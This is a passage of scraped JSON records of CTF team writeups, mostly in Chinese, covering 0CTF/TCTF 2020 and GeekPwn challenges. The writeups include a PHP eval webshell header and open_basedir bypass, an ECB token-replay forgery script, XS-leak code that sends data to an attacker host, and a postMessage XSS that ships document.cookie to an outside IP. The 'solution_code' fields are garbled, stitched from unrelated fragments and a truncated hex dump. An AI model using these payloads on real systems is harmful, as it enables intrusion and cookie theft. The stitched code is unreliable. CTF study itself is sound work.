string.digits) for _ in range(4))\n        if sha256((s+s0).encode()).hexdigest() == s1:\n            rt.sendline(s)\n            break\n", "tools": ["sage", "python", "pycryptodome", "z3", "burp", "radare2", "wireshark"], "file_path": "temp_repos\\r3kapig_writeup\\20200508-de1ctf\\README.md", "file_size": 53206, "scraped_at": "2025-10-26T18:19:25.932640"}
{"id": "r3kapig_writeup_0CTF_TCTF_2020_Quals_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "0CTF/TCTF 2020 Quals Writeup", "attack_type": "AES", "writeup": "# 0CTF/TCTF 2020 Quals Writeup\n\n## Writeup\n\n### Misc/Cloud Computing\n\n简单fuzz后，选择使用header来绕过并rce\n\n```php\nhttp://pwnable.org:47780/?action=upload&data=<?=end(getallheaders());?>\n\nheader最后一个字段加上:eval($_POST[a]);\n```\n\n加上`error_reporting(-1)`再`scandir()`得到报错发现有openbasedir和disable_function， 绕过一下：\n\n```php\nerror_reporting(E_ALL);mkdir('/var/www/html/sandbox/xxxxxxxxxxxx/AAA');chdir('/var/www/html/sandbox/xxxxxxxxxxxx/AAA');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');\n```\n\n然后`readfile('/flag')`发现是乱码，`base64_encode(file_get_contents('/flag'))`先转base64再本地转一下，file命令查看发现是gzip压缩包，解压出来一个文件系统\n\n```\nLinux rev 1.0 ext2 filesystem data (mounted or unclean), UUID=d4d08581-e309-4c51-990b-6472ba249420 (large files)\n```\n\n使用r-studio恢复数据得到flag\n\n\n### babyring\n\nhash碰撞\n\n随机生成 2^16 个msg，每个msg生成一个rc4的异或和，一共 2^16 个\n随机生成 2^16 个x1，每个x1生成一个ys1，一共 2^16 个\n随机生成 2^16 个x2，每个x1生成一个ys2，一共 2^16 个\n随机生成 2^16 个x3，每个x1生成一个ys3，一共 2^^16 个\n每个rc4异或和与每个ys1异或，得到2^32个值，打表\n每个ys2与每个ys3异或，得到2^32个值，打表\n\n找到两个表中相同的元素即可\n\n### emmm\n\n设res文件里的值为 (x_i, y_i)\n\n假如能找到一组 (x1,y1),(x2,y2) 满足 x1*n=x2 (mod p)，且n比较小，就能够 O(n^2) 求解 k1\n\n```python=\ntmp0 = x * k0 % p\ntmp1 = tmp0  * c % m\ntmp2 = tmp1 * k1 % p\n```\n\n考虑 encrypt(n*x1)\n\ntmp0 = (n*x1) * k0 % p = n * (x1 * k0 % p) - t1 * p   （0≤t1<n）\ntmp1 = n * (x1 * k0 % p * c % m) + (-t1 * p * c) % m - t2 * m  （0≤t2≤n）\n(模p意义下) y2 = tmp2 = n * y1 + ((-t1 * p * c) % m - t2 * m) * k1\n\n枚举 t1,t2 就能解 k1\n\n因为有 2^24 个x，所以有 2^48 组(x1,x2)，p有58位，n大概最小能到 2^12 左右\n\n``` python=\nK0 = 134854706973672807\nK1 = 187692079449969593\ninvC = 1131579515458719391\ndef inv(x):\n    return pow(x,P-2,P)\ndef decrypt(y,K0,K1):\n    global P,C,M\n    ans = []\n    for t3 in range(5):\n        x = (y * inv(K1) % P + P*t3) * invC % M * inv(K0) % P\n        if encrypt_block(x)==y:\n            ans.append(x)\n    return ans\n```\n\n\n\n\n\n\n### lottery\necb重放。16字节一个block，替换前4个block。注意的是，会更换user的前一个byte，因此我们需要找到和我们的目标user第一个byte相同的用户。多开，爆破之。\n```python=\nimport requests\nimport base64\nimport re\nurl = \"http://pwnable.org:2333/user/register\"\nurl_login = \"http://pwnable.org:2333/user/login\"\nurl_buy=\"http://pwnable.org:2333/lottery/buy\"\nurl_info=\"http://pwnable.org:2333/lottery/info\"\n\ndef get_enc_from_username(un):\n    session = requests.session()\n    data={\n    'username':un,\n    'password':\"aaaa\"\n    }\n    register=requests.post(url=url,data=data)\n    login=session.post(url=url_login,data=data)\n    pattern=re.compile(r'\"api_token\":\"(.*?)\",\"coin')\n    m=re.findall(pattern,login.text)\n\n    buy_data={\n    'api_token':m[0]\n    }\n\n    buy=session.post(url=url_buy,data=buy_data)\n    pattern=re.compile(r'\"enc\":\"(.*?)\"')\n    n=re.findall(pattern,buy.text)\n    return n[0]\n\ndef info(enc):\n    session = requests.session()\n    info_data = {\n        'enc': enc\n    }\n    info = session.post(url=url_info, data=info_data)\n    pattern = re.compile(r'\"lottery\":\"(.*?)\",\"user\":')\n    l = re.findall(pattern, info.text)\n    print info.text\n    # print(info.text)\n    # print(\"lottery: \" + l[0] + \"\\n\")\n    pattern = re.compile(r',\"user\":\"(.*?)\",\"coin\":')\n    u = re.findall(pattern, info.text)\n    return u[0]\n\ndef charge(enc):\n    session = requests.session()\n    info_data = {\n        'enc': enc\n    }\n\n    info = session.post(url=url_info, data=info_data)\n    pattern = re.compile(r'\"lottery\":\"(.*?)\",\"user\":')\n    l = re.findall(pattern, info.text)\n    # print(info.text)\n    print(\"lottery: \" + l[0] + \"\\n\")\n    pattern = re.compile(r',\"user\":\"(.*?)\",\"coin\":')\n    u = re.findall(pattern, info.text)\n    print(\"user: \" + u[0])\n    pattern = re.compile(r'\"coin\":(.*?)}')\n    c = re.findall(pattern, info.text)\n    print(\"coin: \" + c[0])\n\n    url_get_money_back = \"http://pwnable.org:2333/lottery/charge\"\n    get_money_back = {\n        'user': u[0],\n        'coin': c[0],\n        'enc': enc\n    }\n    get_back = session.post(url=url_get_money_back, data=get_money_back)\n    print(get_back.text)\n\nimport os\n#enc1=get_enc_from_username(\"fuckallo\")\n#print enc1\nenc1=\"6\\/cdkogK5Y+4ov\\/k0oN0UVZE5L1O+24nfQyb3lXqduDOoB\\/0trCCcL7bzXD73vyMXpUU4K\\/Fls5GL03lgVvBYrk1ARz+kOioplCU7+SMuDJpjFuc1QqQz7hMzncIGijYjPkY23IMIpBaPqBZ5op6hvbSt9reYD8AcCI4hIXsxZg=\"\n#pre1=info(enc1)[0:2]\n#print pre1\npre1=\"11\"\n#raw_input()\nwhile 1:\n    name=os.urandom(4).encode(\"hex\")\n    enc2 = get_enc_from_username(name)\n    pre2=info(enc2)[0:2]\n    print pre1,pre2\n    if pre2==pre1:\n        print \"find\"\n        fakeenc=base64.b64encode(enc2.decode(\"base64\")[0:64]+enc1.decode(\"base64\")[64:])\n        charge(fakeenc)\n```\n\n### Wechat Generator\n\n在svg转换为png图片的时候，可以向svg中插入image标签来读取任意文件，读取app.py得到secret路由\n![](https://i.imgur.com/BuvddkK.png)\n\n发现需要寻找到一个XSS，当将imagemagick转换的后缀名改为htm以后，得到一个html页面，可以插入html标签：\n\n![](https://i.imgur.com/mbm8pZm.png)\n\n发现被CSP拦截，但是发现CSP没有限制meta标签的跳转，同时题目只需要alert(1)即可获得flag，故使用meta标签跳转到自己的vps上触发alert(1)，获得flag，src等参数的过滤可以通过双写绕过\n\n`<memetata name=\"language\" content=\"0;http://vps/a.html\" http-equiv=\"refresh\"\" />`\n\n### Happy_tree\n整个程序的执行逻辑存储在一个树状的结构中（多叉树），", "solution_code": "m = [0x00, 0x01, 0x02, 0x03, 0x0A, 0x0C, 0x0D, 0x0E, 0x13, 0x04, 0x05, 0x06, 0x0F, 0x18, 0x19, 0x21, 0x2A, 0x33, 0x07, 0x08, 0x10, 0x11, 0x1A, 0x22, 0x23, 0x2B, 0x34, 0x09, 0x12, 0x1B, 0x24, 0x2D, 0x36, 0x37, 0x3F, 0x48, 0x0B, 0x14, 0x15, 0x1C, 0x1D, 0x1E, 0x25, 0x2E, 0x27, 0x16, 0x17, 0x1F, 0x20, 0x28, 0x31, 0x3A, 0x42, 0x43, 0x26, 0x2F, 0x30, 0x38, 0x39, 0x40, 0x41, 0x49, 0x4A, 0x29, 0x32, 0x3B, 0x3C, 0x3D, 0x44, 0x4B, 0x4C, 0x4D, 0x2C, 0x35, 0x3E, 0x45, 0x46, 0x47, 0x4E, 0x4F, 0x50]\nfor i in range(9):\n    for j in range(9):\n        v = m[i * 9 + j]\n        tmp[j] = x[v]\n    check_unique(tmp)\n\n    session = requests.session()\n    info_data = {\n        'enc': enc\n    }\n    info = session.post(url=url_info, data=info_data)\n    pattern = re.compile(r'\"lottery\":\"(.*?)\",\"user\":')\n    l = re.findall(pattern, info.text)\n    print info.text\n    # print(info.text)\n    # print(\"lottery: \" + l[0] + \"\\n\")\n    pattern = re.compile(r',\"user\":\"(.*?)\",\"coin\":')\n    u = re.findall(pattern, info.text)\n    return u[0]\n\n\n    info = session.post(url=url_info, data=info_data)\n    pattern = re.compile(r'\"lottery\":\"(.*?)\",\"user\":')\n    l = re.findall(pattern, info.text)\n    # print(info.text)\n    print(\"lottery: \" + l[0] + \"\\n\")\n    pattern = re.compile(r',\"user\":\"(.*?)\",\"coin\":')\n    u = re.findall(pattern, info.text)\n    print(\"user: \" + u[0])\n    pattern = re.compile(r'\"coin\":(.*?)}')\n    c = re.findall(pattern, info.text)\n    print(\"coin: \" + c[0])\n\n\n    url_get_money_back = \"http://pwnable.org:2333/lottery/charge\"\n    get_money_back = {\n        'user': u[0],\n        'coin': c[0],\n        'enc': enc\n    }\n    get_back = session.post(url=url_get_money_back, data=get_money_back)\n    print(get_back.text)\n\n\n    name=os.urandom(4).encode(\"hex\")\n    enc2 = get_enc_from_username(name)\n    pre2=info(enc2)[0:2]\n    print pre1,pre2\n    if pre2==pre1:\n        print \"find\"\n        fakeenc=base64.b64encode(enc2.decode(\"base64\")[0:64]+enc1.decode(\"base64\")[64:])\n        charge(fakeenc)\n\n\n    dword = x\n    for j in range(100000):\n        t = 0x1f\n        for k in range(32/5+1):\n            tmp = dword & t\n            tmp = tmp << 5\n            dword = tmp ^ dword\n            t = t << 5\n        dword = dword & 0xffffffff\n        t = 0xffff8000\n        for k in range(32/0x11+1):\n            tmp = dword & t\n            tmp = tmp >> 0x11\n            dword = tmp ^ dword\n            t = t >> 0x11\n        dword = dword & 0xffffffff\n        t = 0x1fff\n        for k in range(32/0xd+1):\n            tmp = dword & t\n            tmp = tmp << 0xd\n            dword = tmp ^ dword\n            t = t << 0xd\n        dword = dword & 0xffffffff\n    if cnt % 2 == 0:\n        ans += binascii.a2b_hex(hex(dword)[2:-1])[::-1]\n    else:\n        ans += binascii.a2b_hex(hex(dword^0xaaaaaaaa)[2:-1])[::-1]    \n    cnt += 1\n    print hex(dword)\n\n\n    def func():\n        return 1\n\n\n    print(hex(offset))\n\n\n    print('fuck yeah!')\n    x()\n\n\n    #res = requests.get('''http://pwnable.org:19261/?rh=$ffi = FFI::load(\"/flag.h\");$b = FFI::new('long[12]');$heap = FFI::cast(\"long*\", $b); $heap = FFI::cast(\"long\", $heap); $arr = FFI::new('long[1]'); $arr[0] = $heap; $heap_addr = $arr[0]; $ffi_addr = $heap_addr - 0x60; function read_addr8()''')\n    res = requests.get('http://pwnable.org:19261/?rh={}'.format(urllib.parse.quote(src)))\n    print(res)\n    print(res.text)\n\n\n        # if debug:\n        #     gdb.attach(p, f'vmmap')\n        # payload = '%75c%7$hhn%43$hhn'\n        exp(p)\n        p.recv()\n        p.sendline('ls')\n        p.sendline('ls')\n        data = p.recv()\n        if data:\n            print(data)\n            p.interactive()\n            p.close()\n            break\n    except:\n        continue\n\n\n    print(f'{pc0:04x}     {mn:<5s}   {ops}'.rstrip())\n\n\n    assert i in dis\n    print(i)\n\n\n    dec(n);\n    init;\n    fei:=work;\n    print;\n", "tools": ["python", "pycryptodome", "gdb", "radare2"], "file_path": "temp_repos\\r3kapig_writeup\\20200702-0ctf-quals\\README.md", "file_size": 51687, "scraped_at": "2025-10-26T18:19:25.961833"}
{"id": "r3kapig_writeup_GeekPwn_云上挑战赛", "team": "r3kapig", "repo": "writeup", "challenge_name": "GeekPwn 云上挑战赛", "attack_type": "Pwn", "writeup": "# GeekPwn 云上挑战赛\n\n## web\n### cosplay\n\n\n右键查看HTML源代码可以得到如下js，可以发现是一个腾讯云对象存储，给了存储桶名称和地区，然后采用的临时密钥，临时密钥可以在`/GetTempKey?path=/upload`这里可以得到\n\n```javascript\nvar Bucket = '933kpwn-1253882285';\nvar Region = 'ap-shanghai';\n\nvar cos = new COS({\n    getAuthorization: function (options, callback) {\n        var url = '/GetTempKey?path=/upload';\n        var xhr = new XMLHttpRequest();\n        xhr.open('GET', url, true);\n        xhr.onload = function (e) {\n            try {\n                var data = JSON.parse(e.target.responseText);\n                var credentials = data.Credentials;\n            } catch (e) {\n            }\n            if (!data || !credentials) return console.error('credentials invalid');\n            callback({\n                TmpSecretId: credentials.TmpSecretId,\n                TmpSecretKey: credentials.TmpSecretKey,\n                XCosSecurityToken: credentials.Token,\n                ExpiredTime: data.ExpiredTime,\n            });\n        };\n        xhr.send();\n    }\n});\n```\n\n既然已经得到了存储桶的信息和临时密钥，就可以对Bucket进行操作了。官方Node.js SDK文档：https://cloud.tencent.com/document/product/436/8629  在这个文档里给出了`查询对象列表`和`下载对象`的相关代码，所以只需要用临时密钥做授权，先查询对象然后发现flag的位置，之后把flag下载下来就可以了。\n\n不过官方文档里给的代码有一些需要改的，比如把`tmpSecretId`改成`TmpSecretId`(首字母大写)，简单修改一下改成和题目相符的，之后就可以直接用了。先prefix为`''` 读出来`f1L9@`这个目录，然后读这个目录下文件发现flag.txt，之后把flag.txt下载下来就可以啦\n\n```javascript\nvar request = require('request');\nvar COS = require('cos-nodejs-sdk-v5');\nvar fs = require('fs');\nvar cos = new COS({\n    getAuthorization: function (options, callback) {\n        // 异步获取临时密钥\n        request({\n            url: 'http://110.80.136.39:20763/GetTempKey?path=/upload',\n            data: {\n                // 可从 options 取需要的参数\n            }\n        }, function (err, response, body) {\n            // console.log(response)\n            try {\n                var data = JSON.parse(body);\n                // console.log(data)\n                var credentials = data.Credentials;   //note:首字母大写\n                // console.log(credentials)\n            } catch(e) {console.log(e)}\n            if (!data || !credentials) return console.error('credentials invalid!!');\n            callback({\n                TmpSecretId: credentials.TmpSecretId,        // 临时密钥的 tmpSecretId\n                TmpSecretKey: credentials.TmpSecretKey,      // 临时密钥的 tmpSecretKey\n                XCosSecurityToken: credentials.Token, // 临时密钥的 sessionToken\n                ExpiredTime: data.ExpiredTime,               // 临时密钥失效时间戳，是申请临时密钥时，时间戳加 durationSeconds\n            });\n        });\n    }\n});\n\n//note:先prefix为'' 读出来f1L9@这个目录，然后读这个目录下文件发现flag.txt\ncos.getBucket({\n    Bucket: '933kpwn-1253882285', /* 必须 */\n    Region: 'ap-shanghai',     /* 必须 */\n    Prefix: 'f1L9@/',           /* 非必须 */\n}, function(err, data) {\n    console.log(data)   //note:这里要改改 不要用data.content\n});\n\n\n//文件读取\ncos.getObject({\n    Bucket: '933kpwn-1253882285', /* 必须 */\n    Region: 'ap-shanghai',    /* 必须 */\n    Key: 'f1L9@/flag.txt',              /* 必须 */\n    Output: fs.createWriteStream('./exampleobject.txt'),\n}, function(err, data) {\n    console.log(err || data);\n});\n```\n\n\n### no-xss\n\n根据 `/search` 接口的状态码 200 / 404 可以利用 `<script>` 的 onload / onerror 逐字节爆 flag。\n\nexp:\n\n```\n<body>\n    <script>\n    function log(x) {\n        var im=document.createElement('img');\n        im.src='http://MY_IP/log?'+x;\n        document.body.appendChild(im);\n    }\n    log('load');\n    function g(s) {\n        log('done='+s);\n        tryy(s);\n    }\n    function tryy(pfx) {\n        ['{','}','q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','-','_','1','2','3','4','5','6','7','8','9','0'].forEach((c)=>{\n            document.write('<script src=\"http://noxss2020.cal1.cn:3000/search?keyword=flag'+encodeURIComponent(pfx+c)+'\" onload=\"g(\\''+pfx+c+'\\')\"><'+'/script>');\n        });\n    }\n    tryy('');\n    </script>\n</body>\n```\n\n### umsg\nindex.js里有监听器，典型的postmessage xss。\n![](https://i.imgur.com/XVlAcmn.png)\n\n而且跟当年鹅厂的洞很像：https://zhuanlan.zhihu.com/p/25586887\n\n测一下debug，能直接通信\n![](https://i.imgur.com/ssBBxP4.png)\n\n\nbot没限制ur。vps引iframe来打就行了，用子域过match\n![](https://i.imgur.com/Mc3MJn1.png)\n\n```\n<!doctype html>\n\n\n<iframe id=\"frame\" width=\"222\" height=\"400\"></iframe>\n<script>\n    let frame = document.getElementById(\"frame\"); // I don't like being implicit.\n    frame.src = \"http://umsg.iffi.top:3000/\";\n    //frame.src = \"http://ctf.localhost.com/password.html\";\n\n    frame.onload =function(){\n      document.getElementById(\"frame\").contentWindow.postMessage({\"action\":\"append\",\"payload\":\"<img src='' onerror='window.location=`http://120.79.152.66:8888`+document.cookie'>\"},\"*\")\n    }\n</script>\n\n</html>\n```\n![](https://i.imgur.com/9Wa93FJ.png)\n\n\n\n\n\n## Pwn\n### BabyPwn\nlibc 2.23\n两个漏洞：\n1）show 时 index 采用了有符号数比较，可以传负值泄露 libc。\n2）add 的 size 为 0 时，可以一直溢出\n然后就没什么好说的了，直接 house of orange\n```=python\nfrom pwn import *\nfrom ctypes import *\nimport os\nfrom Crypto.Cipher import AES\nfrom binascii import b2a_hex, a2b_hex\nimport struct\n#import roputils as rop\n\nremote_addr = \"110.80.1", "solution_code": "#!/usr/bin/env python3\n\nimport struct\n\n_a = \\\n\"\"\"\n0x55576550  0x00005555  0x8c27d4d4  0x644d42bd\n0x6dac4460  0xd39b649b  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000000  0x00000000\n0x00000000  0x00000000  0x00000004  0x000000ac\n0x000000bb  0x00000031  0x00000088  0x0000002b\n0x00000029  0x0000009a  0x00000020  0x00000078\n0x00000098  0x0000005e  0x000000bb  0x000000b7\n0x00000049  0x00000079  0x000000a9  0x00000036\n0x00000017  0x00000019  0x00000084  0x0000007e\n0x000000cd  0x00000089  0x000000e8  0x000000c8\n0x0000009e  0x0000007b  0x0000003f  0x00000053\n0x0000007b  0x00000021  0x00000031  0x000000b7\n0x000000a4  0x00000028  0x00000074  0x00000068\n0x000000c0  0x000000ba  0x000000cc  0x0000009c\n0x0000003a  0x00000091  0x00000008  0x0000006d\n0x000000b8  0x000000da  0x00000090  0x000000af\n0x00000099  0x00000038  0x00000046  0x000000e9\n0x000000e9  0x00000040  0x000000f3  0x0000002f\n0x000000b8  0x00000099  0x000000c6  0x00000080\n0x00000021  0x00000057  0x0000002e  0x00000029\n0x000000eb  0x00000021  0x00000008  0x0000004f\n0x00000045  0x00000080  0x00000049  0x000000ce\n0x00000098  0x0000002f  0x0000001f  0x0000003b\n0x00000009  0x00000035  0x00000100  0x000000d6\n0x000000dd  0x00000090  0x00000088  0x000000c0\n0x000000a2  0x00000053  0x00000036  0x0000005d\n0x0000008d  0x000000ce  0x000000f0  0x000000ef\n0x000000f5  0x00000022  0x00000005  0x00000067\n0x000000c5  0x000000b7  0x000000fb  0x00000004\n0x00000019  0x00000022  0x00000033  0x000000af\n0x000000c2  0x000000a5  0x000000d3  0x00000020\n0x000000f7  0x000000f3  0x0000003e  0x0000006d\n0x00000041  0x000000e1  0x00000082  0x00000100\n0x00000075  0x00000034  0x000000dc  0x00000031\n0x000000a8  0x0000009c  0x00000040  0x0000006a\n0x00000062  0x000000bb  0x00000075  0x000000be\n0x00000090  0x00000014  0x000000ae  0x00000060\n0x00000080  0x00000009  0x0000003b  0x0000004b\n0x0000003b  0x000000f1  0x00000040  0x00000067\n0x00000025  0x00000018  0x000000d5  0x000000bd\n0x00000035  0x000000a2  0x00000012  0x000000e0\n0x00000008  0x00000070  0x00000037  0x00000058\n0x00000044  0x000000f0  0x00000008  0x00000007\n0x00000067  0x0000009f  0x00000017  0x000000ca\n0x000000ca  0x000000b2  0x0000006a  0x000000bf\n0x00000040  0x000000e3  0x00000094  0x000000c4\n0x00000048  0x00000080  0x0000009c  0x00000068\n0x000000c0  0x0000002a  0x0000006e  0x00000037\n0x0000008c  0x0000002f  0x000000dd  0x000000ae\n0x0000006e  0x00000005  0x0000003d  0x0000001d\n0x0000007a  0x000000c6  0x0000001f  0x000000ca\n0x000000c0  0x000000ba  0x0000009a  0x0000006d\n0x000000fe  0x000000ec  0x000000df  0x000000dd\n0x00000074  0x00000065  0x00000066  0x00000007\n0x000000fd  0x00000074  0x00000067  0x00000020\n0x000000d0  0x00000072  0x00000075  0x000000d9\n0x000000ff  0x0000000e  0x000000e9  0x0000009f\n0x00000067  0x0000006b  0x0000006a  0x00000090\n0x00000069  0x000000df  0x000000b9  0x000000f0\n0x000000b1  0x0000007d  0x00000056  0x000000fe\n0x00000029  0x000000bc  0x0000006b  0x0000009c\n0x0000006d  0x0000000d  0x00000003  0x000000bc\n0x00000063  0x00000056  0x0000008b  0x000000a8\n0x00000061  0x0000000a  0x000000a6  0x0000001d\n0x000000f2  0x000000cf  0x00000010  0x00000006\n0x0000000c  0x0000000a  0x00000063  0x0000008b\n0x000000a6  0x00000011  0x000000b4  0x000000ec\n0x00000078  0x00000010  0x00000014  0x00000043\n0x00000069  0x0000003c  0x00000099  0x00000080\n0x00000017  0x000000cd  0x00000047  0x000000ee\n0x00000026  0x000000fd  0x00000062  0x0000009a\n0x000000f6  0x00000097  0x00000074  0x00000006\n0x0000004d  0x000000d0  0x00000065  0x00000063\n0x00000020  0x0000003e  0x000000e3  0x0000006d\n0x0000000e  0x000000c3  0x000000da  0x000000c8\n0x00000020  0x0000000b  0x0000001d  0x00000092\n0x0000001d  0x0000002d  0x00000088  0x000000aa\n0x000000d2  0x0000006d  0x0000000f  0x0000001e\n0x00000051  0x00000073  0x00000088  0x00000050\n0x00000004  0x0000004a  0x000000b0  0x0000005a\n0x00000030  0x00000022  0x000000f6  0x00000050\n0x0000009b  0x0000005a  0x00000082  0x00000070\n0x000000af  0x00000093  0x0000008a  0x00000100\n0x00000044  0x0000007b  0x000000c3  0x0000006f\n0x0000003f  0x0000005d  0x00000069  0x00000016\n0x00000070  0x0000000a  0x00000059  0x000000e0\n0x000000cb  0x00000022  0x00000011  0x000000d1\n0x0000006a  0x000000d5  0x00000014  0x00000043\n0x00000042  0x000000e0  0x0000005f  0x000000c4\n0x00000008  0x000000d3  0x0000000c  0x000000a8\n0x00000031  0x00000004  0x0000002d  0x00000078\n0x000000ba  0x0000001e  0x000000cf  0x00000058\n0x000000cb  0x00000029  0x00000013  0x000000c0\n0x00000027  0x00000097  0x000000f6  0x0000003c\n0x00000086  0x0000004c  0x000000c7  0x00000007\n0x000000f7  0x0000001e  0x000000ef  0x000000d3\n0x000000ac  0x000000dc  0x0000005f  0x00000084\n0x00000002  0x000000dc  0x00000081  0x0000008c\n0x0000002c  0x000000c4  0x000000ed  0x00000037\n0x0000001e  0x00000066  0x000000ce  0x00000037\n0x000000c5  0x00000093  0x0000000b  0x0000009a\n0x000000b7  0x00000006  0x0000001b  0x0000007e\n0x000000b6  0x00000035  0x00000064  0x000000dd\n0x0000003e  0x0000004f  0x0000006a  0x000000c2\n0x0000008b  0x000000ed  0x000000d7  0x000000e2\n0x00000088  0x000000bb  0x00000019  0x000000c8\n0x00000026  0x000000c0  0x0000005a  0x000000ef\n0x000000b1  0x0000000c  0x000000a8  0x0000001a\n0x00000052  0x00000097  0x000000e0  0x00000087\n0x00000041  0x000000bc  0x000000de  0x0000008d\n0x0000009e  0x000000a2  0x00000007  0x0000004d\n0x00000069  0x00000097  0x000000c4  0x0000000f\n0x00000068  0x0000008b  0x0000004d  0x0000000d\n0x00000021  0x0000003f  0x00000036  0x00000091\n0x00000054  0x000000e0  0x000000fe  0x00000011\n0x00000003  0x000000d4  0x00000052  0x0000008d\n0x0000001b  0x000000fc  0x00000085  0x000000ce\n0x000000ae  0x000000e9  0x00000096  0x00000080\n0x0000009b  0x000000d6  0x000000a1  0x000000c2\n0x000000a2  0x000000e0  0x00000012  0x0000001f\n0x00000100  0x00000015  0x0000007e  0x00000086\n0x000000c2  0x000000ac  0x00000036  0x00000057\n0x0000009a  0x0000001c  0x00000027  0x0000003f\n0x0000005a  0x0000005c  0x000000e0  0x00000090\n0x0000000b  0x00000013  0x00000035  0x000000f9\n0x00000076  0x0000009b  0x000000b6  0x00000085\n0x000000d5  0x000000ae  0x00000054  0x00000056\n0x0000006f  0x000000a4  0x00000045  0x000000b4\n0x0000009e  0x000000bd  0x000000d1  0x000000c9\n0x0000006e  0x00000064  0x0000000d  0x00000037\n0x00000036  0x000000e3  0x0000004c  0x00000022\n0x00000013  0x000000c9  0x000000ea  0x0000000f\n0x000000c3  0x00000074  0x000000bc  0x0000001e\n0x00000030  0x00000095  0x000000fa  0x00000046\n0x0000005c  0x00000039  0x000000c8  0x00000049\n0x000000dd  0x0000008d  0x00000044  0x000000b5\n0x000000c4  0x00000046  0x000000a7  0x000000e7\n0x0000008d  0x00000002  0x000000c2  0x00000096\n0x0000006b  0x00000096  0x00000097  0x00000046\n0x00000043  0x000000cc  0x000000d8  0x00000022\n0x000000c6  0x00000062  0x00000039  0x0000009f\n0x000000b2  0x000000e2  0x00000047  0x00000039\n0x000000ef  0x0000000b  0x00000031  0x0000006a\n0x000000bf  0x00000039  0x000000c6  0x0000000a\n0x0000007f  0x00000038  0x0000000e  0x000000ad\n0x0000008f  0x000000a4  0x00000092  0x0000000d\n0x00000043  0x0000006d  0x0000007b  0x00000051\n0x000000fe  0x00000074  0x000000bb  0x0000005c\n0x00000052  0x0000001c  0x00000098  0x000000a8\n0x000000b9  0x00000035  0x000000b2  0x00000016\n0x000000fc  0x00000008  0x00000057  0x0000001e\n0x0000009d  0x000000e2  0x00000076  0x00000096\n0x000000d3  0x00000062  0x0000009e  0x000000d3\n0x00000063  0x0000002d  0x0000004c  0x0000009d\n0x000000b9  0x0000002f  0x00000059  0x00000094\n0x00000094  0x00000050  0x00000023  0x000000f1\n0x00000003  0x0000005b  0x00000079  0x00000078\n0x00000037  0x00000015  0x000000c1  0x0000000d\n0x0000000c  0x000000c7  0x00000005  0x00000055\n0x00000070  0x00000066  0x000000fb  0x0000004a\n0x0000005d  0x00000081  0x000000af  0x000000ec\n0x000000c3  0x00000060  0x00000024  0x000000c2\n0x00000096  0x0000000b  0x00000062  0x00000037\n0x0000001c  0x0000003b  0x000000e7  0x00000088\n0x000000fa  0x000000fd  0x000000a5  0x000000b1\n0x000000a7  0x000000ae  0x000000bb  0x000000e3\n0x00000054  0x00000077  0x00000017  0x00000010\n0x0000005d  0x00000092  0x00000001  0x00000064\n0x00000010  0x00000006  0x00000004  0x0000009e\n0x00000083  0x000000eb  0x0000002c  0x000000fc\n0x00000043  0x000000f1  0x00000030  0x000000de\n0x00000003  0x0000006f  0x00000036  0x0000009e\n0x00000019  0x000000ad  0x000000ff  0x000000b5\n0x000000ec  0x000000bc  0x000000f0  0x000000a6\n0x000000e4  0x000000f5  0x00000039  0x000000d8\n0x000000ff  0x0000005c  0x00000083  0x000000df\n0x000000d1  0x00000005  0x00000073  0x0000004d\n0x00000063  0x000000af  0x00000022  0x0000001e\n0x000000bc  0x00000058  0x000000af  0x00000004\n0x000000bc  0x000000f9  0x00000068  0x00000050\n0x000000a4  0x000000f8  0x000000a6  0x00000076\n0x000000d8  0x00000081  0x0000000f  0x00000085\n0x0000005d  0x00000088  0x00000019  0x000000e6\n0x00000077  0x000000a4  0x0000002d  0x00000013\n0x000000f8  0x000000cf  0x000000f4  0x00000016\n0x000000a9  0x000000e2  0x0000007f  0x00000023\n0x00000065  0x00000080  0x0000005e  0x00000052\n0x000000b8  0x00000012  0x000000de  0x0000000e\n0x00000050  0x000000e9  0x0000002d  0x00000095\n0x00000054  0x0000000d  0x000000fd  0x00000059\n0x0000003c  0x0000002c  0x000000e7  0x00000019\n0x000000b3  0x0000001b  0x000000ae  0x000000d3\n0x0000009f  0x0000007f  0x000000d6  0x00000039\n0x0000001f  0x000000df  0x000000e1  0x00000004\n0x0000003b  0x000000ab  0x000000fb  0x000000ec\n0x000000c8  0x000000db  0x0000002c  0x00000070\n0x000000f8  0x00000087  0x00000061  0x00000054\n0x00000033  0x00000075  0x0000008b  0x00000066\n0x000000f6  0x00000058  0x00000039  0x0000009f\n0x0000004e  0x00000066  0x000000b2  0x000000e2\n0x00000004  0x000000f9  0x0000006c  0x00000044\n0x00000064  0x00000076  0x00000063  0x00000077\n0x000000e8  0x00000008  0x0000003b  0x0000005b\n0x0000001e  0x0000007f  0x00000068  0x00000045\n0x0000002f  0x00000093  0x00000054  0x000000b2\n0x00000038  0x0000004f  0x000000b7  0x000000ef\n0x0000008f  0x000000aa  0x0000005c  0x00000098\n0x000000af  0x000000cb  0x00000002  0x0000004c\n0x000000ca  0x0000008b  0x00000077  0x0000001c\n0x00000015  0x0000002b  0x00000063  0x0000008d\n0x000000c0  0x0000009d  0x00000042  0x0000015e\n0x000000a4  0x000000fe  0x00000011  0x0000001d\n0x00000021  0x0000009c  0x0000000a  0x00000082\n0x0000009b  0x00000005  0x00000021  0x00000061\n0x00000093  0x0000001c  0x000000bf  0x00000071\n0x000000b1  0x000000aa  0x0000010a  0x00000068\n0x000000cd  0x000000a0  0x00000038  0x000000b3\n0x00000013  0x00000026  0x0000008e  0x00000083\n0x0000000a  0x000000ae  0x000000f4  0x00000055\n0x00000046  0x00000059  0x000000f7  0x000000ea\n0x00000003  0x0000009b  0x000000f2  0x000000e4\n0x000000d8  0x00000002  0x00000021  0x000000bc\n0x00000034  0x00000015  0x00000010  0x00000053\n0x00000008  0x0000000c  0x000000fe  0x000000f4\n0x000000f6  0x000000eb  0x000000ed  0x000001bb\n0x00000093  0x000000da  0x00000035  